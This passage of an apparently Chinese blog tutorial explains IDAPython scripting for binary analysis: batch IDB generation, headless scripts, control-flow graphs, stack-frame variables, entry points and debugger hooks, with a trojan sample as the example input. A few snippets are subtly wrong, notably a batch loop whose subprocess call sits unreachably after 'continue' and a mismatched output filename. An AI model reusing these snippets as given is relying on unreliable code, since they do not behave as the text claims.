中当我们并不知道文件的位置或者并不知道用户想要把他们的数据存储在什么地方，输入输出文件就很重要了。导入导出文件我们可以使用 ida_kernwin.ask_file(for_saving, mask, prompt)这个函数，当 forsave 参数为 0，打开一个文件对话框，当 forsave 的参数为 1，打开一个文件保存对话框，mask 用来指定文件后缀或者模式，比如我只想打开.dll 文件的话就可已使用“*.dll”作为 mask 的参数，prompt 是窗口的名称。</p><h4 id="批生成文件"><a href="#批生成文件" class="headerlink" title="批生成文件"></a>批生成文件</h4><p>有时，为目录中的所有文件创建 IDB 或 ASM 可能很有用。 在分析属于同一系列恶意软件的一组样本时，这可以帮助节省时间。比起手工做这件事情，写一个批处理文件会容易许多，我们只需要将-B 该参数传给 idaw.exe 即可，下面的代码可以被复制到包含我们想为其生成文件的所有文件的目录中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line">paths = glob.glob(<span class="string">"*"</span>)</span><br><span class="line">ida_path = os.path.join(os.environ[<span class="string">'PROGRAMFILES'</span>], <span class="string">"IDA"</span>,<span class="string">"idaw.exe"</span>)</span><br><span class="line"><span class="keyword">for</span> file_path <span class="keyword">in</span> paths:</span><br><span class="line">    <span class="keyword">if</span> file_path.endswith(<span class="string">".py"</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        subprocess.call([ida_path, <span class="string">"-B"</span>, file_path])</span><br></pre></td></tr></table></figure><p>脚本运行完成后，会在当前目录下生成ASM文件和IDB文件。</p><h4 id="可执行脚本"><a href="#可执行脚本" class="headerlink" title="可执行脚本"></a>可执行脚本</h4><p>ipapython脚本可以在命令行中执行，我们也可以使用下面计算 IDB 拥有指令个数的脚<br>本，然后将其个数写进一个叫做“instru_count.txt”文件中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">idaapi.auto_wait()</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    flags = idc.get_func_attr(func, FUNCATTR_FLAGS)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; idc.FUNC_LIB:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> instru <span class="keyword">in</span> idautils.FuncItems(func):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"instru_count.t"</span>,<span class="string">'w'</span>) </span><br><span class="line"></span><br><span class="line">writeContent = <span class="string">"Instruction count is &#123;&#125;"</span>.format(count)</span><br><span class="line"></span><br><span class="line">print(writeContent)</span><br><span class="line"></span><br><span class="line">f.write(writeContent)</span><br><span class="line">f.close()</span><br><span class="line">idc.qexit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>上面两个十分重要的函数，一个是<code>idaapi.auto_wait()</code>,一个是<code>idc.qexit(0)</code>,当ida打开一个文件的时候，等待IDA分析完成是很重要的，因为 IDA 分析一个文件需要花大量的时间。这时候你不能执行 IDAPython 脚本，所以你可使用<code>idaapi.auto_wait()</code>来等待IDA文件分析结束，它会在 IDA 分析完成之前一直等待，一旦分析完成，控制权就会交到脚本身上。然后我们同样需要使用 idc.qexit(0)来结束脚本的执行，如果不这么做的话，IDB 可以会在关闭的时候出问题。</p><p>如果我们想要计算IDB包含的多少行的话，我们可以使用以下的指令完成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idat.exe -A   -S<span class="string">"test.py"</span>  .\Trojan.Win32.AntiAV.aaa.json.idb</span><br></pre></td></tr></table></figure><p>-A表示自动化分析，-S表示idb被打开之后立即执行的脚本。</p><p>同时自动化脚本也是支持参数的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idat.exe -A   -S<span class="string">"test.py test"</span>  .\Trojan.Win32.AntiAV.aaa.json.idb</span><br></pre></td></tr></table></figure><p>就能够向脚本中传参数test，可以使用<code>idc.ARGV</code>获取。</p><h4 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h4><p>使用ida python生成CFG图。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cls_main</span><span class="params">(p=True)</span>:</span></span><br><span class="line">    f = idaapi.FlowChart(idaapi.get_func(here()))</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">if</span> p:</span><br><span class="line">            print(<span class="string">"%x - %x [%d]:"</span> % (block.start_ea, block.end_ea, block.id))</span><br><span class="line">        <span class="keyword">for</span> succ_block <span class="keyword">in</span> block.succs(): <span class="comment"># 获取后继节点</span></span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                print(<span class="string">"  succs: %x - %x [%d]:"</span> % (succ_block.start_ea, succ_block.end_ea, succ_block.id))</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">for</span> pred_block <span class="keyword">in</span> block.preds(): <span class="comment"># 获取前驱节点</span></span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                print(<span class="string">"  preds:%x - %x [%d]:"</span> % (pred_block.start_ea, pred_block.end_ea, pred_block.id))</span><br><span class="line">        </span><br><span class="line">cls_main()</span><br></pre></td></tr></table></figure><h4 id="函数栈帧的访问"><a href="#函数栈帧的访问" class="headerlink" title="函数栈帧的访问"></a>函数栈帧的访问</h4><p>在x86程序中，EBP寄存器通常专门用做栈帧指针，例外 gun/g++提供 -fomit-frame-pointer编译选项，可以生成不依赖于固定帧指针寄存器的函数。</p><p><img src="https://pic.wonderkun.cc/uploads/2020/12/Snipaste_2020-01-29_21-46-07.png" alt="Snipaste_2020-01-29_21-46-07"><br>基于ebp做栈帧指针的函数，正偏移是函数参数，负偏移是则用于访问函数的局部变量。</p><p>很明显函数的栈帧是一个运行时的概念，没有栈和运行时的程序，栈帧就不可能存在。话虽如此，但是并不意味者ida在做静态的分析的时候就会忽略掉栈帧的概念。二进制文件中包含配置每个函数栈帧所需的所有代码，通过仔细分析这些代码，我们就可以深入了解任何函数的栈帧结构，即使这个函数并未运行。在IDA中也会有一些复杂的分析来确定IDA反汇编的每个函数的栈帧布局。在分析的过程中，IDA会记住每一次push/pop操作，以及其他的任何可能改变栈指针的运算，如增加或者减去常量，尽可能的去观察栈指针在函数执行时的行为。</p><p>IDA提供一个摘要视图，列出了栈帧内被直接引用的每一个变量，以及变量的大小和与它们与帧指针的偏移距离。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">404C90 ; int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)</span><br><span class="line">.text:00404C90 _WinMain@16     proc near               ; CODE XREF: start+186↓p</span><br><span class="line">.text:00404C90</span><br><span class="line">.text:00404C90 phkResult       &#x3D; dword ptr -658h</span><br><span class="line">.text:00404C90 Data            &#x3D; byte ptr -654h</span><br><span class="line">.text:00404C90 var_650         &#x3D; WNDCLASSEXW ptr -650h</span><br><span class="line">.text:00404C90 String1         &#x3D; word ptr -620h</span><br><span class="line">.text:00404C90 var_61E         &#x3D; byte ptr -61Eh</span><br><span class="line">.text:00404C90 anonymous_0     &#x3D; byte ptr -41Ah</span><br><span class="line">.text:00404C90 var_418         &#x3D; word ptr -418h</span><br><span class="line">.text:00404C90 var_416         &#x3D; byte ptr -416h</span><br><span class="line">.text:00404C90 anonymous_1     &#x3D; byte ptr -212h</span><br><span class="line">.text:00404C90 String2         &#x3D; word ptr -210h</span><br><span class="line">.text:00404C90 var_20E         &#x3D; byte ptr -20Eh</span><br><span class="line">.text:00404C90 anonymous_2     &#x3D; byte ptr -0Ah</span><br><span class="line">.text:00404C90 StackCookie     &#x3D; dword ptr -4</span><br><span class="line">.text:00404C90 hInstance       &#x3D; dword ptr  8</span><br><span class="line">.text:00404C90 hPrevInstance   &#x3D; dword ptr  0Ch</span><br><span class="line">.text:00404C90 lpCmdLine       &#x3D; dword ptr  10h</span><br><span class="line">.text:00404C90 nShowCmd        &#x3D; dword ptr  14h</span><br></pre></td></tr></table></figure><p>但是需要注意的是 <code>arg_0</code> 对应的偏移是 <code>ebp+0x4</code>,<code>arg_4</code>对应的偏移是<code>ebp+0x8</code>。</p><p>idapython也提供获取此函数栈帧的api，获取到之后是一个结构体，操作结构体成员就可以获取到函数栈帧内的所有变量。相关的函数说明如下：</p><ul><li>idaapi.get_func(ea): retrieves the <code>func_t</code> structure for the function at <code>ea</code></li><li><code>idaapi.get_frame(func_t foo)</code>: returns the <code>struct_t</code> structure for the function frame specified by <code>foo</code></li><li><code>idautils.DecodeInstruction(ea)</code>: returns the <code>inst_t</code> representing instruction at <code>ea</code>,和函数<code>idaapi.decode_insn</code>功能相同。</li><li>idaapi.get_stkvar(op_t op, sval_t v): <code>op</code> is a reference to an instruction, <code>v</code> is the immediate value in the operand. Usually you just use <code>op.addr</code>. It returns a tuple, <code>(member_t, val)</code>. <code>member_t</code> is a pointer to the stack variable, which is what we need. <code>val</code> is the same value as the <code>soff</code> field in the <code>member_t</code> for the stack var. More on this later.</li><li>idaapi.xreflist_t()<code>: creates a new</code>xreflist<code>of</code>xreflist_entry_t`</li><li>idaapi.build_stkvar_xrefs(xreflist_t xrefs, func_t func, member_t member): fills xrefs with <code>xreflist_entry_t</code>‘s that represent the stack var xrefs given by <code>member</code> in <code>func</code>.</li><li><code>struct_t.get_member(x)</code>: You can use this method to iterate all stack variables in a frame to retrieve all <code>member_t</code>‘s. If you want to build xrefs for all stack variables, this is usually easier.</li><li><code>idc.get_member_name(id, member_offset)</code>: id is the struct sid，member_offset. get the member name defined in the name.</li><li><code>idc.get_member_offset(id,name)</code>： 获取偏移。</li></ul><p>下面对<code>iautils.DecodeInstruction(ea)</code>指令进行一个简单的说明，这是一个指令解码的API，如果解码失败返回None，否则将返回一个包含该指令及其操作数的指令对象。</p><p>比较重要的指令属性如下：</p><ul><li><p><code>inst.itype</code> 标志当前指令的类型，是一个整数，不同的opcode可能有相同的itype，但是opcode不是itype。</p></li><li><p><code>inst.size</code>: 表示解码后的指令长度</p></li><li><p><code>inst.ops[]</code>:以0为索引的数组，用来保存操作数的相关信息</p></li><li><p><code>inst.Op1...inst.OpN</code>： 以1位索引起始操作数组别名,和inst.ops[n+1]等价。</p></li><li><p><code>inst.ea</code>： 指令的线性地址。</p><p>你可能会想知道opcode和它的<code>itype</code>之间到底是什么关系。其实很简单，在IDA中，开源数据库处理器模块负责根据opcode来填充<code>itype</code>字段。在IDA SDK中，你可以找到一个<code>allins.hpp</code>的头文件。该头文件包含了所有支持的处理器模块的枚举数据其中包含了受支持的所有指令： </p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Excerpt from allins.hpp</span></span><br><span class="line"><span class="comment">// x86/x64 itypes</span></span><br><span class="line"><span class="keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">NN_null = <span class="number">0</span>,            <span class="comment">// Unknown Operation</span></span><br><span class="line">NN_aaa,                 <span class="comment">// ASCII Adjust after Addition</span></span><br><span class="line">NN_aad,                 <span class="comment">// ASCII Adjust AX before Division</span></span><br><span class="line">NN_aam,                 <span class="comment">// ASCII Adjust AX after Multiply</span></span><br><span class="line">NN_aas,                 <span class="comment">// ASCII Adjust AL after Subtraction</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">NN_jz,                  <span class="comment">// Jump if Zero (ZF=1)</span></span><br><span class="line">NN_jmp,                 <span class="comment">// Jump</span></span><br><span class="line">NN_jmpfi,               <span class="comment">// Indirect Far Jump</span></span><br><span class="line">NN_jmpni,               <span class="comment">// Indirect Near Jump</span></span><br><span class="line">NN_jmpshort,            <span class="comment">// Jump Short (not used)</span></span><br><span class="line">NN_lahf,                <span class="comment">// Load Flags into AH Register</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"><span class="comment">// Pentium III Pseudo instructions</span></span><br><span class="line">NN_cmpeqps,             <span class="comment">// Packed Single-FP Compare EQ</span></span><br><span class="line">NN_cmpltps,             <span class="comment">// Packed Single-FP Compare LT</span></span><br><span class="line">NN_cmpleps,             <span class="comment">// Packed Single-FP Compare LE</span></span><br><span class="line">NN_cmpunordps,          <span class="comment">// Packed Single-FP Compare UNORD</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 不知道为什么，反正<code>NN_</code>前缀用来表示x86/x64处理器上的指令。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .text:00402085 74 09 jz short loc_402090</span></span><br><span class="line">inst = idautils.DecodeInstruction(<span class="number">0x402085</span>)</span><br><span class="line">print(<span class="string">"YES"</span> <span class="keyword">if</span> inst.itype == idaapi.NN_jz <span class="keyword">else</span> <span class="string">"NO"</span>)</span><br></pre></td></tr></table></figure><p> 至于操作数，可以通过访问<code>inst.Operands[]</code>或者<code>inst.OpN</code>来访问。要获取被解码指令使用的操作数数量不应依赖<code>Operands</code>数组的长度，因为它总是被解析成<code>UA_MAXOP==8</code>（参阅ida.hpp）。因此应该使用遍历每个操作数并检查操作数的类型是否是<code>o_void</code>类型。 </p><p> 操作数的定义是<code>ua.hpp</code>中的<code>op_t</code>结构。 </p><ul><li><p><code>op.flags</code>：操作数的标志</p></li><li><p><code>op.dtype</code>：操作数的长度类型。<code>idaapi.dt_xxx</code>常量，可以通过该常量来获取操作数的字节大小（1 == idaapi.dt_byte,2 == idaapi.dt_word等等）。</p></li><li><p><code>op.type</code>：操作数类型。<code>idc.o_xxx</code>常量。</p></li><li><p><code>specflags1</code>…<code>specflags4</code>：处理器相关标志。</p><p>以下是受支持的操作数类型（<code>o_xxx</code>）:</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">o_void：没有该操作数。</span><br><span class="line">o_reg：该操作数是寄存器（ax,al,es,ds等等）</span><br><span class="line">o_mem：直接寻址（数据）</span><br><span class="line">o_phrase：[基址+变址]寻址</span><br><span class="line">o_displ：[基址+变址+偏移]寻址</span><br><span class="line">o_imm：立即数</span><br><span class="line">o_far：直接远地址（far address，代码）</span><br><span class="line">o_near：直接近地址（near address，代码）</span><br><span class="line">o_dispspec0...o_dispspec5：处理器相关标志。</span><br></pre></td></tr></table></figure><p>还有一些操作数成员的含义因操作数的类型而异：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">op<span class="number">_</span>reg：寄存器编号（o<span class="number">_</span>reg）</span><br><span class="line">op<span class="number">_p</span>hrase：内存访问中的索引寄存器（o<span class="number">_p</span>hrase）</span><br><span class="line">op<span class="number">_</span><span class="keyword">value</span>：立即数（o<span class="number">_</span>imm）或偏移（o<span class="number">_</span>displ）</span><br><span class="line">op<span class="number">_</span>addr： 操作数使用的内存地址（o<span class="number">_m</span>em，o<span class="number">_f</span>ar，o<span class="number">_</span>displ，o<span class="number">_n</span>ear）</span><br></pre></td></tr></table></figure><p> 当操作数的类型是<code>o_reg</code>或者<code>o_phrase</code>的时候，<code>op_reg</code>/<code>op_phrase</code>值包含了对应寄存器的枚举值。就像<code>NN_xxx</code>专有标签，IDA SDK同样提供了寄存器的名称常量，以及其对应的值；但是，这只适用于<code>x86</code>/<code>x64</code>处理器模块。我从<code>intel.hpp</code>中摘抄了一部分： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> RegNo</span><br><span class="line">&#123;</span><br><span class="line">  R_ax = <span class="number">0</span>,</span><br><span class="line">  R_cx,</span><br><span class="line">  R_dx,</span><br><span class="line">  R_bx,</span><br><span class="line">  R_sp,</span><br><span class="line">  R_bp,</span><br><span class="line">  R_si,</span><br><span class="line">  R_di</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 不幸的是，这些值并没有被IDAPython导出，但是至少我们知道了足够多的信息来定义下边的一些数据： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REG_EAX = <span class="number">0</span></span><br><span class="line">REG_EDX = <span class="number">2</span></span><br><span class="line">REG_EBP = <span class="number">5</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">REG_NAMES = &#123; REG_EAX: <span class="string">'eax'</span>, REG_EDX: <span class="string">'edx'</span>, REG_EBP: <span class="string">'ebp'</span> ...&#125;</span><br></pre></td></tr></table></figure><p>可以利用如下代码获取某个函数栈帧的所有成员以及偏移。注意获取的frame不仅包括函数栈帧还包括返回地址以及形参。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">addr = here()</span><br><span class="line"></span><br><span class="line">func = idaapi.get_func(addr)</span><br><span class="line">frame = idaapi.get_frame(func)</span><br><span class="line">print(frame)</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">dictMem = &#123;&#125;</span><br><span class="line"><span class="keyword">while</span>(x &lt; frame.memqty):</span><br><span class="line">    name = idc.get_member_name(frame.id, frame.get_member(x).soff)</span><br><span class="line">    dictMem[name] =  hex(idc.get_member_offset(frame.id,name))</span><br><span class="line">    x = x+<span class="number">1</span></span><br><span class="line">print(dictMem)</span><br></pre></td></tr></table></figure><p>获得的结果如下：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;'phkResult': '0x10', </span><br><span class="line">'Data': '0x14', </span><br><span class="line">'var_650': '0x18', </span><br><span class="line">'String1': '0x48', </span><br><span class="line">'var_61E': '0x4a', </span><br><span class="line">'anonymous_0': '0x24e', </span><br><span class="line">'var_418': '0x250', </span><br><span class="line">'var_416': '0x252', </span><br><span class="line">'anonymous_1': '0x456', </span><br><span class="line">'String2': '0x458', </span><br><span class="line">'var_20E': '0x45a', </span><br><span class="line">'anonymous_2': '0x65e', </span><br><span class="line">'StackCookie': '0x664', </span><br><span class="line">' s': '0x668', </span><br><span class="line">' r': '0x66c', </span><br><span class="line">'hInstance': '0x670', </span><br><span class="line">'hPrevInstance': '0x674', </span><br><span class="line">'lpCmdLine': '0x678', </span><br><span class="line">'nShowCmd': '0x67c'</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意此偏移都是相对于当前栈帧的栈底(也就是esp)来说的。注意两个非常重要的成员” r”和” s”，其中” r”代表返回地址存储的偏移，” s”代表当前函数栈帧中ebp距离esp的位置(也就是函数栈帧的大小)。<strong>注意有个空格</strong></p><p>也可以利用此frame的结构来获取x86中当前函数参数的字节数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ret_off = idc.get_member_offset(frame.id,<span class="string">" r"</span>)</span><br><span class="line">first_arg_off = ret_off + <span class="number">4</span> </span><br><span class="line">args_size = idc.get_struc_size(frame.id) - first_arg_off</span><br><span class="line"></span><br><span class="line">print(args_size)</span><br></pre></td></tr></table></figure><p>获取某个函数的某一条指令中引用的函数栈帧变量的名字以及在frame中的偏移，并获取其他地方引用此变量的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x00404C90 is the function address</span></span><br><span class="line"><span class="comment"># 0x00404CA4 is an instruction address referencing</span></span><br><span class="line"><span class="comment"># a stack variable. It looks like:</span></span><br><span class="line"><span class="comment"># .text:00404CA4  mov     [esp+668h+StackCookie], eax</span></span><br><span class="line"><span class="comment"># .text:00404CBF  mov     ecx, [esp+668h+StackCookie] ; StackCookie</span></span><br><span class="line"></span><br><span class="line">pFunc = idaapi.get_func(<span class="number">0x00404C90</span>)</span><br><span class="line">pFrame = idaapi.get_frame(pFunc)</span><br><span class="line">inst = idautils.DecodeInstruction(<span class="number">0x00404CA4</span>)</span><br><span class="line">op = inst[<span class="number">0</span>] <span class="comment">#获取第一个操作数，注意此操作数必须有栈帧变量的引用，否则下条指令会报错</span></span><br><span class="line">pMember, val = idaapi.get_stkvar(inst,op, op.addr) <span class="comment"># pMember 是frame结构体中的成员，val是在frame中的偏移量</span></span><br><span class="line"></span><br><span class="line">xrefs = idaapi.xreflist_t()</span><br><span class="line">idaapi.build_stkvar_xrefs(xrefs, pFunc, pMember)</span><br><span class="line"><span class="keyword">for</span> xref <span class="keyword">in</span> xrefs:</span><br><span class="line">    print(hex(xref.ea)) <span class="comment">#print xref address</span></span><br></pre></td></tr></table></figure><p>也可以使用如下代码找具体的某个栈帧变量在函数中的引用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pFunc = idaapi.get_func(<span class="number">0x00404C90</span>)</span><br><span class="line">pFrame = idaapi.get_frame(pFunc)</span><br><span class="line"></span><br><span class="line">dictMem = dict()</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(x &lt; pFrame.memqty):</span><br><span class="line">    dictMem[idc.get_member_name(pFrame.id, pFrame.get_member(x).soff)] = pFrame.get_member(x)</span><br><span class="line">    x = x+<span class="number">1</span></span><br><span class="line"><span class="comment"># given var name you can now use the</span></span><br><span class="line"><span class="comment"># dictionary to grab the member_t to pass</span></span><br><span class="line"><span class="comment"># to build_stkvar_xrefs</span></span><br><span class="line">pMem = dictMem[<span class="string">"hInstance"</span>]</span><br><span class="line">xrefs = idaapi.xreflist_t()</span><br><span class="line">idaapi.build_stkvar_xrefs(xrefs, pFunc, pMem)</span><br><span class="line"><span class="keyword">for</span> xref <span class="keyword">in</span> xrefs:</span><br><span class="line">    print(hex(xref.ea)) <span class="comment">#print xrefs to var_4</span></span><br></pre></td></tr></table></figure><h4 id="程序入口点"><a href="#程序入口点" class="headerlink" title="程序入口点"></a>程序入口点</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">idc.get<span class="constructor">_entry_qty()</span> 获取入口点个数</span><br><span class="line">idc.get<span class="constructor">_entry_ordinal(<span class="params">index</span>)</span> 获取入口点地址</span><br><span class="line">idc.get<span class="constructor">_entry_name(<span class="params">ordinal</span>)</span> 入口名</span><br></pre></td></tr></table></figure><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>安装调试的hook使用如下api：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugger = idaapi.DBG_Hooks()</span><br><span class="line">debugger.hook()</span><br></pre></td></tr></table></figure><p> 现在运行调试器，hook 会捕捉所有的调试事件，这样就能非常精确的控制 IDA 调试器。 下面的函数在调试的时候非常有用: </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">idc.add_bpt( long<span class="built_in"> Address </span>) # 在指定的地点设置软件断点。</span><br><span class="line">idc.get_bpt_qty() #返回当前设置的断点数量。</span><br><span class="line">idc.get_reg_value(string Register) # 获取寄存器的值 